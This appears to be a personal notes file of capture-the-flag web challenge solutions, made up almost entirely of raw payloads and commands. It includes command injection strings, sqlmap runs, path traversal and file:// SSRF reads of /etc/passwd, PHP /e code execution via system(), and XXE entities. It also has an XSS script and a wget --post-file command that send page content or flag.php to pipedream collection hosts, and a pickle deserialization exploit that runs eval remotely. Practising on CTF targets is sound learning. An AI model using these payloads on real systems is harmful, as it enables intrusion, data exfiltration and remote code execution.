# ctf
ctf

Ping station (Command injection vulnerability)
1.1.1.1;ls
1.1.1.1; cat flag – open file
1.1.1.1; pwd – current directory
1.1.1.1; whoami – current user
1.1.1.1; find / -name flag – search
1.1.1.1; ps aux -- Display running processes on the system.
1.1.1.1; top -- Display real-time system information, such as running processes, memory, and CPU usage.

 small-data-leak (Sql Injection vulnerability)
http://34.141.113.155:32320/user?id= 
└─$ sqlmap -u http://34.141.113.155:32320/user?id=1
sqlmap -u "http://34.141.113.155:32320/user?id=1" –dbs
$ sqlmap -u "http://34.141.113.155:32320/user?id=1" -D public –tables
$ sqlmap -u "http://34.141.113.155:32320/user?id=1" -D public -T "ctf{57b23475b9b02093a9eb5d7df5f07957e2b2dc724443d6b08961fbe3387" –columns
 file-crawler(File Inclusion)
<img src="local?image_name=static/path.jpg" align="middle">
http://34.141.113.155:32610/local?image_name=../../../etc/passwd
curl http://34.107.71.117:30687/local?image_name=/tmp/flag

Attackers might encode characters in the URL to evade detection. For example, converting characters like & or / into their hexadecimal equivalents (%26 for & or %2F for /) can bypass simple filters that don't decode URLs before checking.
•	Example: /admin → %2Fadmin.

 ultra-crawl
file:///home/ctf/app.py
curl -X POST "http://34.141.113.155:30477/" -d "url=file:///etc/passwd"   
curl -X POST "http://34.141.113.155:30477" -d "url=file:///home/ctf/sir-a-random-folder-for-the-flag/flag.txt"
└─$ curl -X GET "http://34.141.113.155:30477/" -H "Host: company.tld"
 alien-inclusion(Request Forgery)
curl http://34.141.113.155:31736/?vector=/Admin/e&replace=phpinfo()
curl "http://34.141.113.155:31736/?start=" --data "start=flag.php"   
                                                                                                                                                                                                 
 substitute(Code Execution)
http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('whoami')
http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('ls -la')
http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('ls -la /var/www/html/here_we_dont_have_flag')
http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('cat /var/www/html/here_we_dont_have_flag/flag.txt')


Downloader-v1:
https://eodlwq7lnoytrkk.m.pipedream.net / --post-file '/var/www/html/flag.php' 

framable:
<script> 
var exfil = document.getElementsByTagName("body")[0].innerHTML; 
window.location.href="https://enmi59d56bybo.x.pipedream.net?gio=" + btoa(exfil); 
</script> 

manual-review:
<script>window.location.href="https://your-pipedream-url.x.pipedream.net/hello";</script> 

cyntaxcheck payloads:
payload 1: 
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM 
"file:///var/www/html/flag"> 
]> 
<foo> 
</foo> 
Payload 2: 
&xxe; 
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM 
"php://filter/convert.base64-encode/resource=/var/www/html/flag"> 
]> 
<foo> 
&xxe; 
</foo> 

alpa-cookie:
pip install pwntools 
python3 

 from pwn import xor 
 decoded_data = 
bytes.fromhex("6f50327a481d6d33243e3f5a32375d2427765d486933047422362b3a6b3b2a04
 4c3c64") 
key = "G4BJBNJCALR3AD4KIQW8X9WSWENHL1Z6FOJ" 
result = xor(decoded_data, key)
print(result)
import pickle 
parsed_data = pickle.loads(b"(dp0\nS'permission'\np1\nS'user'\np2\ns.") 
print(parsed_data)
 parsed_data['permission'] = 'admin' 
mofified_payload = pickle.dumps(parsed_data, protocol=2) 
print(modified_payload)
print(mofified_payload)
encoded_payload = xor(mofified_payload, key)
 print(encoded_payload.hex())

 rundown:
 curl -X POST "http://35.198.127.202:30947/" > output.html 
 firefox output.html
Payload:  
import pickle as cPickle 
import base64 
import os 
import string 
import requests 
import time 
class Exploit(object): 
def __reduce__(self): 
return (eval, ('eval(open("flag","r").read())',)) 
def sendPayload(p): 
newp = base64.urlsafe_b64encode(p).decode() 
headers = {'Content-Type': 'application/T3jv1l'} 
r = 
requests.post("http://34.159.172.66:32274/",headers=headers,data=newp) 
return r.text 
payload_dec = cPickle.dumps(Exploit(), protocol=2) 
print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + 
"}") 
